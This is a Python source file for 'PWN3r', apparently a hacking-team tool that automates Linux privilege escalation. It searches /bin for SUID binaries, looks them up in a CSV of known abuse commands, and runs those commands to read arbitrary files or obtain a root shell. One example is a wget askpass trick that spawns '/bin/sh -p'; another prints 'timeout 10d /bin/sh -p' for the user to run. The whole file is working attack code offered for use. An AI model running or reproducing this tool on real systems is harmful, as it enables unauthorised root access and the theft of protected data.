  
import subprocess
import argparse
import os
import csv
import sys


#############################################
# ANSI escape codes for different colors    #
RESET = "\033[0m"                           #
BLACK = "\033[30m"                          #
RED = "\033[31m"                            #
GREEN = "\033[32m"                          #
YELLOW = "\033[33m"                         #
BLUE = "\033[34m"                           #
MAGENTA = "\033[35m"                        #
CYAN = "\033[36m"                           #
WHITE = "\033[37m" 
WHITEBACK = "\033[47m"                         #
#erase from cursor until end of screen      #
ERASETOEND = "\033[0J"                      #
#erase from cursor to beginning of screen   #
ERASETPBEGAIN = "\033[1J"                   #
#erase from cursor to end of line           #
ERASETOENDLINE = "\033[0K"                  #
#erase start of line to the cursor          #
ERASETOSTARTLINE = "\033[1K"                #
#erase the entire line                      #
ERASEENTIRELINE = "\033[2K"                 #
#erase entire screen                        #
ERASEENTIRESCREEN = "\033[2J"               #
#moves cursor to line #, column #           #
#\033[{line};{column}f	                    #
#moves cursor to home position (0, 0)       #
MOVETOHOME = "\033[H"                       #
#request cursor position (reports ESC[#;#R) #
REQUESTPOSTION = "\033[6n"                  #
#save cursor position (SCO)                 #
SAVE = "\033[s"                             #
#restores the cursor to saved position (SCO)#
RESTOR = "\033[u"                           #
#############################################

ids =  {}
data =[]
PWN3rFile = "../data/PWN3r.csv"
def printLogo():
    logo = f"""{GREEN}                                                   ..
                                                 ^@@@@!.
 ___    _       _  _   _    ___                  G@@@@@5::.
(  _`\ ( )  _  ( )( ) ( ) /'_  )      	        ^P@@@@@@@@5
| |_) )| | ( ) | || `\| |(_)_) | _ __ 	      ~P@@@@@B^~~^.
| ,__/'| | | | | || , ` | _(_ < ( '__)	 ^77@@@@@@@P~  	
| |    | (_/ \_) || |`\ |( )_) || |    J@@@@@@@@&P~
(_)    `\___x___/'(_) (_)`\____)(_)    !#@@@@@@@5
{RESET}{WHITEBACK}{BLACK}EGY{RED}CCAL{RESET} Team{GREEN}                           .^7&@@@@G
                                           ^^^^.  

    {RESET}"""
    print(logo)
    print(SAVE)
    return  


def optionParsing():
    parser = argparse.ArgumentParser()
    parser.add_argument('-f', '--find', nargs='?', const=True, default=False, help='find the binary files with the suid bit set on Linux')
    parser.add_argument('-e', '--exec',nargs='?', const=True, default=False, help='execute the binary file')
    args = parser.parse_args()
    find_value = args.find
    #print (find_value)
    exec_value = args.exec
    #print (exec_value)
    return find_value, exec_value


def wgetFunction():
    # create a temporary file with the shell commands
    temp_file = subprocess.run(['mktemp'], stdout=subprocess.PIPE).stdout.decode().strip()
    subprocess.run(['chmod', '+x', temp_file])
    with open(temp_file, 'w') as f:
        f.write('#!/bin/sh -p\n/bin/sh -p 1>&0\n')

    # run the command with wget
    subprocess.run(['wget', '--use-askpass={}'.format(temp_file), '0'])

    # cleanup the temporary file
    subprocess.run(['rm', temp_file])
    return 

def timeoutFunction():
    
    print ("please run this command:\ntimeout 10d /bin/sh -p")
    return 


def Goodbye():   
    print(f"{RED}Goodbye!{RESET}")
    return

def Invalid_Choice():   
    print(f"{RED}Invalid choice. Please try again.{RESET}")
    return

def noOption():
    while True:
        # Print the menu options
        print(f"{CYAN}Menu:{RESET}")
        print(f"{YELLOW}1. List binaries with SUID bit set{RESET}")
        print(f"{GREEN}2. execute the binary{RESET}")
        print(F"{RED}3. Quit{RESET}")

        # Get the user's choice
        choice = input("Enter an option: ")

        # Handle the user's choice
        if choice == "1":
            findOption()
            break   
        elif choice == "2":
            findOption()
            executeOption()
            break
        elif choice == '3':
            Goodbye()
            break
        else:
            Invalid_Choice()
    return 

def suidbitSearch():
    #printLogo()
    print (f"searching for binaries with 'suid' bit set...")
    
    cmd = "ls /bin/ -al | awk '{if(substr($1, 4, 1) == \"s\")print $9}'"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        c = 1
        output_dict ={}
        for line in result.stdout.splitlines():
            key = c
            value = line
            output_dict[key] = value
            c = c + 1
        #for k , v in output_dict.items():
            #print(f"{k}:{v}")

        data = openCsv()
        found_bin = [cmd for cmd in output_dict.values()]
        cmds = []
        #####################################
 
        #    print(bin)
        ######################################        
        for bin in found_bin:
            for row in data:
                #use strip to remove spaces in the start and end of the text
                if row["name"].strip()== bin:
                    cmds.append(row)
                elif row["name"].strip() == "ruby" and "ruby" in bin:
                    cmds.append(row)   
                elif row["name"].strip() =="python" and "python" in bin :
                    cmds.append(row)
                elif row["name"].strip() =="gcc" and "gcc"in bin : 
                    cmds.append(row)
                elif row["name"].strip() =="as" and "as" in bin :
                    cmds.append(row)
                elif row["name"].strip() =="perl" and "perl" in bin :
                    cmds.append(row)
        if len(cmds) == 0:
            cmds= None
                    
        return cmds
    else:
        print(result.stderr)
        sys.exit()
        




def openCsv():
    cmd= f"file {PWN3rFile}"
    result = subprocess.run(cmd,shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        if "CSV text" in result.stdout:
            #print ("Loading ...")
            with open(PWN3rFile) as file:
                reader = csv.DictReader(file)
                data = [row for row in reader]
                return data
        elif "No such file or directory" in result.stdout:
            print("Sorry :( I can't find the CSV command file.")
            sys.exit()
        else:
            print("The CSV command file is not in the correct format :(")
    else:
        print("There is an unexpected error")
        print(result.stderr) 
    return sys.exit()
   
   

#the input is th list of found bin in format like {"id":"{"id":"1","name":"cat", "cmd":"cat '$file'", "type": "File Read"}"} and the id you want to execute
def findOption():
    cmds = suidbitSearch()
   
    if cmds != None:
        print ("The binaries with 'suid'bit set is :")
        #to sort the list of found bin by the id value 
        cmds =  sorted(cmds, key=lambda cmd: int(cmd['id']))
        for cmd in cmds:
            print (cmd["id"] +":"+ cmd["name"] )
            ids[cmd["id"]] = cmd
    else:
        print(f"There is no suitable binaries with 'suid' bit set ")
        sys.exit()

    return 


#the input is th list of found bin in format like {"id":"{"id":"1","name":"cat", "cmd":"cat '$file'", "type": "File Read"}"} and the id you want to execute
def executeOption(id = 0):
    id = input(f"Enter the command ID opress 'q' to exit.\n")
    if id == 'q':
        sys.exit()
    while id not in ids.keys() :
        id = input(f"You have entered an invalid Value, please a valid Value or press 'q'.\n")
        if id == 'q':
            sys.exit()

    if ids[id]["type"] == "File Read":
        print("file read")
        filename = input("Enter the file name that you want to read\n")
        if ids[id]["notes"] != '':
            print(ids[id]["notes"]) 
        cmd = ids[id]["cmd"]
        cmd = cmd.replace("'$FILE'",filename)
        result = subprocess.run(cmd ,shell= True)
        if result.returncode == 0 :
            print(result.stdout)
        else:
            print(result.stderr)
    elif ids[id]["type"] == "Gain Root Access":
        if ids[id]["name"] == "wget":
            wgetFunction()
        elif ids[id]["name"] == "timeout":
            timeoutFunction()
        elif ids[id]["name"] == "mv":
            print ("move command")
        else:
            cmd = ids[id]["cmd"]
            print(cmd)
            result = subprocess.run(cmd, shell=True)
            if result.returncode == 0 :
                print(result.stdout)
            else:
                print (result.stderr)
    else:
        print ("pass")
    return 



def main():
    printLogo()
    find_value,exec_value = optionParsing()
    if find_value == False and exec_value == False:
        noOption()
    elif find_value == True:
        findOption()
    elif exec_value == True:
        findOption()
        executeOption()
    return 

if __name__ == "__main__":
    main()